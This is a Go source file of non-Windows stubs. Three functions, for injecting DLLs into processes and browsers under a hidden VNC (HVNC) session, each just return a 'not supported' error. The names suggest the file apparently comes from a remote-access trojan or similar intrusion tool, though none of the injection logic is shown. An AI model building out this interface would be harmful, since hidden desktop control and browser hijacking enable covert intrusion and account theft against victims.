//go:build !windows

package capture

import "errors"

func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string) error {
	return errors.New("HVNC injection not supported on this platform")
}

func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
	return errors.New("HVNC injection not supported on this platform")
}

func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool) error {
	return errors.New("HVNC injection not supported on this platform")
}
